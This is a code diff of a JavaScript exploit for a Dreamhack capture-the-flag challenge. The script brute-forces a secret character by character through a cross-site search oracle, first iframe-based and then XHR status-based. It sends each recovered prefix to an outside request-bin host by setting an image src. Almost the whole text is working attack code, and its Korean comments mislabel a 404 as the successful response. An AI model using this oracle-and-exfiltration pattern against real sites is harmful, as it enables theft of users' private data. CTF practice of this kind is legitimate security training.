@@ -3,20 +3,31 @@
 <script>
     async function req(url) {
         return await new Promise((resolve, reject) => {
-            const iframe = document.getElementById("iframe");
-            iframe.src = url;
-            iframe.onload = () => { 
-                if (iframe.contentWindow.frames.length != 0)
-                    return resolve();
-                else
-                    return reject();
+            var xhr = new XMLHttpRequest();
+
+            xhr.open('GET', url, true);
+
+            xhr.onreadystatechange = function () {
+              if (xhr.readyState == 4) {
+                // 요청이 완료되었을 때
+                if (xhr.status == 404) {
+                  // 성공적인 응답
+                  return reject();
+                } else {
+                  // 다른 상태 코드에 대한 처리
+                  return resolve();                    
+                }
+              }
             };
+
+            xhr.send();
+
         });
     }
     async function search(query) {
         try {
             await req(
-              `https://localhost:8000/search?query=${query}`
+              `http://host3.dreamhack.games:9962/search?query=${query}`
             );
             return true;
         } catch (e) {
@@ -30,7 +41,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://otqvuek.request.dreamhack.games/${secret}`;
+                    img.src = `https://xojxvht.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
